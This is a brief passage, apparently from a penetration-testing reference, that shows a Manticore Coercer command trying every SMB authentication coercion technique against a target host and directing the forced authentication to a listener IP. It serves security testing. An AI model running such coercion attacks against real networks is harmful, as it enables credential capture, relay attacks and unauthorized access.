Every coercion technique has prerequisites that must be met on the target. The following command uses [Manticore Coercer](https://github.com/TheManticoreProject/coercer) to attempt all relevant SMB coercion techniques. Success depends on the prerequisites for at least one technique being met.

```bash
manticore-coercer coerce -t <target> -u <user> -p <pass> -d <domain> -l <listener-ip> --always-continue --path-type smb
```
